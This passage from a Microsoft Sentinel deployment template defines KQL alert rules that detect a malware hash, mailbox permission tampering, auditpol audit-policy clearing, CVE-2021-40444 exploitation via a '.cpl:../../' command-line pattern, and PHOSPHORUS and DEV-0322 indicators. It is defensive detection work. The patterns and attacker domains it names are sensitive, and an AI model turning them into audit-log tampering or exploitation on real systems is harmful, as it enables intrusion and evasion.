          "query": "let SHA256Hash = \"1174fd03271f80f5e2a6435c72bdd0272a6e3a37049f6190abf125b216a83471\" ;\n(union isfuzzy=true\n(CommonSecurityLog \n| parse Message with * '(' DNSName ')' * \n| where isnotempty(FileHash)\n| where FileHash in (SHA256Hash) \n| extend Account = SourceUserID, Computer = DeviceName, IPAddress = SourceIP\n),\n(Event\n//This query uses sysmon data depending on table name used this may need updataing\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Hashes = EventDetail.[16].[\"#text\"]\n| parse Hashes with * 'SHA256=' SHA265 ',' * \n| where isnotempty(Hashes)\n| where Hashes in (SHA256Hash) \n| extend Account = UserName\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "CredentialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "3174a9ec-d0ad-4152-8307-94ed04fa450a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d115a649-db56-43d8-b7da-f24e17cccfae')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d115a649-db56-43d8-b7da-f24e17cccfae')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detecting Impossible travel with mailbox permission tampering & Privilege Escalation attempt",
          "description": "This hunting query will alert on any Impossible travel activity in correlation with mailbox permission tampering followed by account being added to a PIM managed privileged group.\nEnsure this impossible travel incident with increase of privileges is legitimate in your environment.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityAlert \n| where AlertName == \"Impossible travel activity\"\n| extend Extprop = parsejson(Entities)\n| mv-expand Extprop\n| extend Extprop = parsejson(Extprop)\n| extend CmdLine = iff(Extprop['Type']==\"process\", Extprop['CommandLine'], '')\n| extend File = iff(Extprop['Type']==\"file\", Extprop['Name'], '')\n| extend Account = Extprop['Name']\n| extend Domain = Extprop['UPNSuffix']\n| extend Account = iif(isnotempty(Domain) and Extprop['Type']==\"account\", tolower(strcat(Account, \"@\", Domain)), iif(Extprop['Type']==\"account\", tolower(Account), \"\"))\n| extend IpAddress = iff(Extprop[\"Type\"] == \"ip\",Extprop['Address'], '')\n| extend Process = iff(isnotempty(CmdLine), CmdLine, File)\n| project TimeGenerated,Account,IpAddress,CompromisedEntity,Description,ProviderName,ResourceId\n| join kind=inner\n(\nOfficeActivity\n| where Operation =~ \"Add-MailboxPermission\"\n| extend value = tostring(parse_json(Parameters)[3].Value)\n| where value contains \"FullAccess\"\n| where ResultStatus == \"True\"\n| project Parameters,TimeGenerated,value,RecordType,Operation,OrganizationId,UserType,UserKey,OfficeWorkload,ResultStatus,OfficeObjectId,UserId,ClientIP,ExternalAccess,OriginatingServer,OrganizationName,TenantId,ElevationTime,SourceSystem,OfficeId,OfficeTenantId,Type,SourceRecordId\n) on $left.Account == $right.UserId\n| join kind=inner\n(\nAuditLogs\n| where ActivityDisplayName =~ \"Add eligible member to role in PIM requested (timebound)\"\n| where AADOperationType =~ \"CreateRequestEligibleRole\"\n| where TargetResources has_any (\"-PRIV\", \"Administrator\", \"Security\")\n| extend BuiltinRole = tostring(parse_json(TargetResources[0].displayName))\n| extend CustomGroup = tostring(parse_json(TargetResources[3].displayName))\n| extend TargetAccount = tostring(parse_json(TargetResources[2].displayName))\n| extend Initiatedby = Identity\n| project TimeGenerated, ActivityDisplayName, AADOperationType, Initiatedby, TargetAccount, BuiltinRole, CustomGroup, LoggedByService, Result, ResourceId, Id\n| sort by TimeGenerated desc\n) on $left.UserId == $right.Initiatedby\n| project AADOperationType, ActivityDisplayName,AccountCustomEntity=Initiatedby, Id,ResourceId,IPCustomEntity=IpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "1399664f-9434-497c-9cde-42e4d74ae20e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/be458541-d111-424a-b89b-d478d14e02fe')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/be458541-d111-424a-b89b-d478d14e02fe')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Audit policy manipulation using auditpol utility",
          "description": "This detects attempt to manipulate audit policies using auditpol command.\nThis technique was seen in relation to Solorigate attack but the results can indicate potential  malicious activity used in different attacks.\nThe process name in each data source is commented out as an adversary could rename it. It is advisable to keep process name commented but \nif the results show unrelated false positives, users may want to uncomment it.\nRefer to auditpol syntax: https://docs.microsoft.com/windows-server/administration/windows-commands/auditpol  \nRefer to our M365 blog for details on use during the Solorigate attack:\nhttps://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet AccountAllowList = dynamic(['SYSTEM']);\nlet SubCategoryList = dynamic([\"Logoff\", \"Account Lockout\", \"User Account Management\", \"Authorization Policy Change\"]); // Add any Category in the list to be allowed or disallowed\nlet tokens = dynamic([\"clear\", \"remove\", \"success:disable\",\"failure:disable\"]); \n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n//| where Process =~ \"auditpol.exe\" \n| where CommandLine has_any (tokens)\n| where AccountType !~ \"Machine\" and Account !in~ (AccountAllowList)\n| parse CommandLine with * \"/subcategory:\" subcategorytoken\n| extend SubCategory = tostring(split(subcategorytoken, \"\\\"\")[1]) , Toggle =  tostring(split(subcategorytoken, \"\\\"\")[2])\n| where SubCategory in~ (SubCategoryList) //use in~ for inclusion or !in~ for exclusion\n| where Toggle !in~ (\"/failure:disable\", \" /success:enable /failure:disable\") // use this filter if required to exclude certain toggles\n| project TimeGenerated, Computer, Account, SubjectDomainName,  SubjectUserName, Process, ParentProcessName,  CommandLine, SubCategory, Toggle\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n),\n(\nDeviceProcessEvents\n| where TimeGenerated >= ago(timeframe)\n// | where InitiatingProcessFileName =~ \"auditpol.exe\" \n| where InitiatingProcessCommandLine has_any (tokens)\n| where AccountName !in~ (AccountAllowList)\n| parse InitiatingProcessCommandLine with * \"/subcategory:\" subcategorytoken\n| extend SubCategory = tostring(split(subcategorytoken, \"\\\"\")[1]) , Toggle =  tostring(split(subcategorytoken, \"\\\"\")[2])\n| where SubCategory in~ (SubCategoryList) //use in~ for inclusion or !in~ for exclusion\n| where Toggle !in~ (\"/failure:disable\", \" /success:enable /failure:disable\") // use this filter if required to exclude certain toggles\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessParentFileName,  InitiatingProcessCommandLine, SubCategory, Toggle\n| extend timestamp = TimeGenerated, AccountCustomEntity = AccountName, HostCustomEntity = DeviceName\n),\n(\nEvent\n| where TimeGenerated > ago(timeframe)\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key=tostring(['@Name']), Value=['#text']\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, EventID, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n// | where OriginalFileName =~ \"auditpol.exe\"\n| where CommandLine has_any (tokens)\n| where User !in~ (AccountAllowList)\n| parse CommandLine with * \"/subcategory:\" subcategorytoken\n| extend SubCategory = tostring(split(subcategorytoken, \"\\\"\")[1]) , Toggle =  tostring(split(subcategorytoken, \"\\\"\")[2])\n| where SubCategory in~ (SubCategoryList) //use in~ for inclusion or !in~ for exclusion\n| where Toggle !in~ (\"/failure:disable\", \" /success:enable /failure:disable\") // use this filter if required to exclude certain toggles\n| project TimeGenerated, Computer, User, Process, ParentImage,  CommandLine, SubCategory, Toggle\n| extend timestamp = TimeGenerated, AccountCustomEntity = User, HostCustomEntity = Computer\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "66276b14-32c5-4226-88e3-080dacc31ce1",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/80bc29d4-d713-41d3-8c17-b2744f606378')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/80bc29d4-d713-41d3-8c17-b2744f606378')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "MSHTML vulnerability CVE-2021-40444 attack",
          "description": "This query detects attacks that exploit the CVE-2021-40444 MSHTML vulnerability using specially crafted Microsoft Office documents. \n The detection searches for relevant files used in the attack along with regex matches in commnadline to look for pattern similar to : \".cpl:../../msword.inf\"\n Refrence: https://www.microsoft.com/security/blog/2021/09/15/analyzing-attacks-that-exploit-the-mshtml-cve-2021-40444-vulnerability/",
          "severity": "High",
          "enabled": true,
          "query": "( union isfuzzy=true\n(SecurityEvent\n| where EventID==4688\n| where isnotempty(CommandLine)\n| extend FileName = Process, ProcessCommandLine = CommandLine\n| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\n  or ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n),\n(DeviceProcessEvents\n| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\nor ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingProcessAccountUpn, HostCustomEntity = DeviceName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1 \n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| extend Image = column_ifexists(\"Image\", \"\"), ProcessCommandLine = column_ifexists(\"CommandLine\", \"\")\n| extend FileName = split(Image, '\\\\', -1)[-1]\n| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\n  or ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, HostCustomEntity = Computer\n)\n)",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "972c89fa-c969-4d12-932f-04d55d145299",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c62d2f52-cde7-4a27-b9ef-2c239c270fdb')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c62d2f52-cde7-4a27-b9ef-2c239c270fdb')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known PHOSPHORUS group domains/IP - October 2020",
          "description": "Matches IOCs related to PHOSPHORUS group activity published October 2020 with CommonSecurityLog, DnsEvents, OfficeActivity and VMConnection dataTypes.\nReferences: ",
          "severity": "High",
          "enabled": true,
          "query": "let DomainNames = dynamic([\"de-ma.online\", \"g20saudi.000webhostapp.com\", \"ksat20.000webhostapp.com\"]);\nlet EmailAddresses = dynamic([\"munichconference1962@gmail.com\",\"munichconference@outlook.de\", \"munichconference@outlook.com\", \"t20saudiarabia@gmail.com\", \"t20saudiarabia@hotmail.com\", \"t20saudiarabia@outlook.sa\"]);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n(union isfuzzy=true\n(CommonSecurityLog \n| parse Message with * '(' DNSName ')' * \n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend RequestURLIP = extract(IPRegex, 0, Message)\n| where (isnotempty(DNSName) and DNSName has_any (DomainNames)) \n  or (isnotempty(DestinationHostName) and DestinationHostName has_any (DomainNames)) \n  or (isnotempty(RequestURL) and (RequestURL has_any (DomainNames)))\n| extend timestamp = TimeGenerated , AccountCustomEntity = SourceUserID, HostCustomEntity = DeviceName\n),\n(DnsEvents \n| extend DestinationIPAddress = IPAddresses, DNSName = Name, Host = Computer\n| where DNSName has_any (DomainNames) \n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host),\n(VMConnection \n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| where isnotempty(DNSName)\n| where DNSName has_any (DomainNames)\n| extend timestamp = TimeGenerated , HostCustomEntity = Computer),\n(SecurityAlert\n| where ProviderName =~ 'OATP'\n| extend UPN = case(isnotempty(parse_json(Entities)[0].Upn), parse_json(Entities)[0].Upn, \n                    isnotempty(parse_json(Entities)[1].Upn), parse_json(Entities)[1].Upn,\n                    isnotempty(parse_json(Entities)[2].Upn), parse_json(Entities)[2].Upn,\n                    isnotempty(parse_json(Entities)[3].Upn), parse_json(Entities)[3].Upn,\n                    isnotempty(parse_json(Entities)[4].Upn), parse_json(Entities)[4].Upn,\n                    isnotempty(parse_json(Entities)[5].Upn), parse_json(Entities)[5].Upn,\n                    isnotempty(parse_json(Entities)[6].Upn), parse_json(Entities)[6].Upn,\n                    isnotempty(parse_json(Entities)[7].Upn), parse_json(Entities)[7].Upn,\n                    isnotempty(parse_json(Entities)[8].Upn), parse_json(Entities)[8].Upn,\n                    parse_json(Entities)[9].Upn)\n| where Entities has_any (EmailAddresses)\n| extend timestamp = TimeGenerated, AccountCustomEntity = tostring(UPN)),\n(AzureDiagnostics\n| where ResourceType =~ \"AZUREFIREWALLS\"\n| where msg_s has_any (DomainNames)\n| extend timestamp = TimeGenerated))",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "InitialAccess"
          ],
          "techniques": [
            "T1071",
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7249500f-3038-4b83-8549-9cd8dfa2d498",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6dbfb8ae-0f52-4b23-8602-cff63bc6b36e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6dbfb8ae-0f52-4b23-8602-cff63bc6b36e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DEV-0322 Serv-U related IOCs - July 2021",
          "description": "Identifies a match across IOC's related to DEV-0322 targeting SolarWinds Serv-U software.",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/DEV-0322_SolarWinds_Serv-U_IoC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet process = (iocs | where Type =~ \"process\" | project IoC);\nlet parentprocess = (iocs | where Type =~ \"parentprocess\" | project IoC);\nlet IPList = (iocs | where Type =~ \"ip\"| project IoC);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or RequestURL has_any (IPList) or Message has_any (IPList)\n| project TimeGenerated, SourceIP, DestinationIP, Message, SourceUserID, RequestURL, Type\n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURL in (IPList), \"RequestUrl\",\"NoMatch\"), AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, IPMatch == \"RequestUrl\", RequestURL, \"NoMatch\"), AccountCustomEntity = SourceUserID\n),\n(DnsEvents\n| where IPAddresses in (IPList)  \n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DestinationIPAddress = IPAddresses, DNSName = Name, Host = Computer , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host\n),\n(VMConnection\n| where SourceIp in (IPList) or DestinationIp in (IPList)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| project TimeGenerated, Computer, Direction, ProcessName, SourceIp, DestinationIp, DestinationPort, RemoteDnsQuestions, DNSName,BytesSent, BytesReceived, RemoteCountry, Type\n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"NoMatch\"), HostCustomEntity = Computer, ProcessCustomEntity = ProcessName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = EventDetail.[9].[\"#text\"], DestinationIP = EventDetail.[14].[\"#text\"], Image = EventDetail.[4].[\"#text\"]\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, SourceIP, DestinationIP, Image, UserName, Computer, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),  \n(OfficeActivity\n| where ClientIP in (IPList) \n| project TimeGenerated, UserAgent, Operation, RecordType, UserId, ClientIP, AlertDetail = 'Dev-0322 IOC match', Type\n| extend timestamp = TimeGenerated, IPCustomEntity = ClientIP, AccountCustomEntity = UserId\n),\n(DeviceNetworkEvents\n| where  RemoteIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName,  AlertDetail = 'Dev-0322 IOC match', UrlCustomEntity =RemoteUrl, ProcessCustomEntity = InitiatingProcessFileName\n),\n(WindowsFirewall\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, Computer, CommunicationDirection, SourceIP, DestinationIP, SourcePort, DestinationPort, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\"), AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallDnsProxy\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with \"DNS Request: \" ClientIP \":\" ClientPort \" - \" QueryID \" \" Request_Type \" \" Request_Class \" \" Request_Name \". \" Request_Protocol \" \" Request_Size \" \" EDNSO_DO \" \" EDNS0_Buffersize \" \" Responce_Code \" \" Responce_Flags \" \" Responce_Size \" \" Response_Duration\n| where  ClientIP in (IPList)\n| extend timestamp = TimeGenerated, DNSName = Request_Name, IPCustomEntity = ClientIP, AlertDetail = 'Dev-0322 IOC match'\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where SourceHost in (IPList)\n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost, AlertDetail = 'Dev-0322 IOC match'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend ParentImage = EventDetail.[20].[\"#text\"], Image = EventDetail.[4].[\"#text\"]\n| where ( ParentImage has_any (parentprocess) and Image has_any (process))\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256,Image, ParentImage \n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceFileEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess))  or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256, Type, CommandLineIP\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = CommandLineIP\n),\n(DeviceEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess)) or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type, CommandLineIP\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath, AlertDetail = 'Dev-0322 IOC match'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash, IPCustomEntity = CommandLineIP\n),\n(DeviceProcessEvents\n| extend CommandLineIP = extract(IPRegex, 0,InitiatingProcessCommandLine)\n| where (InitiatingProcessFileName in (process) and InitiatingProcessParentFileName in (parentprocess))  or CommandLineIP in (IPList)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, 